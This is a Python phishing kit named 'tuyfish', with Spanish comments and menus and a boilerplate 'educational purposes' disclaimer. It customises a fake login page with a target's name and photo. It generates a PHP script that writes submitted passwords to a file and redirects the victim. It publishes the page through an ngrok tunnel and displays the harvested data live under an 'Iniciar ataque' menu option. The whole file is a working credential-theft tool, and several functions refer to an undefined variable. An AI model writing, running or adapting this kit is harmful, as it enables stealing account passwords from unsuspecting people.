#-*-coding: utf-8 -*-

"""
Descargo de responsabilidad:
Este script, denominado tuyfish, es una herramienta creada con fines educativos únicamente.
El uso de esta herramienta para acceder, interceptar o robar contraseñas sin el consentimiento explícito del propietario
de la cuenta es ilegal y está estrictamente prohibido. El autor y los contribuyentes de este script no asumen ninguna
responsabilidad por cualquier mal uso o consecuencia legal derivada del uso de este script.
El usuario asume la responsabilidad total y el riesgo asociado con el uso de esta herramienta.
Se recomienda encarecidamente utilizar esta herramienta únicamente en entornos controlados y con fines educativos legítimos.
"""

## Módulos a importar
import os
import time
import subprocess
from pyngrok import ngrok
import sys
import signal

clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
php_process = None
ngrok_process = None

def logo():
    print('████████╗██╗   ██╗██╗   ██╗███████╗██╗███████╗██╗  ██╗')
    print('╚══██╔══╝██║   ██║╚██╗ ██╔╝██╔════╝██║██╔════╝██║  ██║')
    print('   ██║   ██║   ██║ ╚████╔╝ █████╗  ██║███████╗███████║')
    print('   ██║   ██║   ██║  ╚██╔╝  ██╔══╝  ██║╚════██║██╔══██║')
    print('   ██║   ╚██████╔╝   ██║   ██║     ██║███████║██║  ██║')
    print('   ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝')                                              
    print('                    By N3RG0')

def handle_signal(signal, frame):
    print("\nSaliendo del programa...")
    time.sleep(2)
    php_process.terminate()
    ngrok.kill()
    sys.exit(0)

def usuarionombre():
    with open('index.html', 'r') as archivo:
        lineas = archivo.readlines()

    name = input('Ingrese el nombre de usuario: \n     1- Atrás\ntuyfish:~$ ')

    lineas[79] = '            <p class="name">Continuar como ' + name + ' <br><a href="index.html" style="font-size: 11px;">¿No eres tú?</a></p>\n'

    with open('index.html', 'w') as archivo:
        archivo.writelines(lineas)

    if y==1:
         clearConsole()
         main()
    clearConsole()
    main()
    archivo.close()

def fotoperfil():
    with open('index.html', 'r') as archivo:
        lineas = archivo.readlines()

    name = input('Ingrese link o ruta de la imagen. \n     1- Atrás\ntuyfish:~$ ')

    lineas[77] = '            <img class="imgp" src="' + name + '">\n'

    with open('index.html', 'w') as archivo:
        archivo.writelines(lineas)

    if y==1:
         clearConsole()
         main()
    clearConsole()
    main()
    archivo.close()

def contra():
    cf_url = tunel()
    signal.signal(signal.SIGINT, handle_signal)
    archivo = open("datos.txt", "w")
    archivo.close()
    while True:
        clearConsole()
        logo()
        print("La URL del túnel es:", cf_url)
        print('\n')
        archivo = open("datos.txt", "r")
        lineas = archivo.readlines()
        archivo.close()

        for linea in lineas:
            print(linea, end='')

        print('\nPulsa CTRL+C para regresar')
        time.sleep(2)

def link():
    archivo= open('login.php', 'w')

    y=input('Inserte un link para redireccionar.\n     1- Atrás\ntuyfish:~$ ')

    r=('''<?php\n$user = $_POST["password"];
    $co = "===========================================\n"; 
    $cl = "===========================================\n";
    $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
    $us = "Password: $user\n";
    fwrite($fileuser, "\n". $co. $us. $cl);
    fclose($fileuser);
    header('Location: '''+y+'''');
    exit();
    ?>''')

    archivo.write(r)
    archivo.close()
    if y==1:
        clearConsole()
        main()
    clearConsole()
    main()


def obtener_token_ngrok():
    try:
        with open('config.txt', 'r') as file:
            token = file.read().strip()
            return token
    except FileNotFoundError:
        return None

def guardar_token_ngrok(token):
    with open('config.txt', 'w') as file:
        file.write(token)

def tunel():
    token = obtener_token_ngrok()

    if token is None:
        token = input("Ingresa tu token de ngrok: ")
        guardar_token_ngrok(token)

    php_process = subprocess.Popen(["php", "-S", "localhost:8080", "-t", "."], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ngrok.set_auth_token(token)
    ngrok_tunnel = ngrok.connect(8080)
    cf_url = ngrok_tunnel.public_url
    clearConsole()
    logo()
    return cf_url

def dependencias():
    os.system("sudo apt install php python3 python3-pip")
    clearConsole()
    os.system("python3 -m pip install pyngrok")
    print("         Instalación completa  ")
    time.sleep(3)
    clearConsole()
    main() 

def main():
    while True:
        logo()
        y = int(input("""             Bienvenido desea:
        1- Iniciar ataque
        2- Ingresar nombre usuario
        3- Ingresar imagen de perfil
        4- Ingresar link a redireccionar
        5- Salir
        0- Instalar dependencias
        tuyfish:~$  """))

        if y == 0:
            clearConsole()
            logo()
            dependencias()
        elif y == 1:
            clearConsole()
            logo()
            contra()
        elif y == 2:
            clearConsole()
            logo()
            usuarionombre()
        elif y == 3:
            clearConsole()
            logo()
            fotoperfil()
        elif y == 4:
            clearConsole()
            logo()
            link()
        elif y == 5:
            print("  HASTA PRONTO!!")
            time.sleep(2)
            clearConsole()
            break
        else:
            print("Opción inválida. Intente de nuevo.")

if __name__ == "__main__":
    main()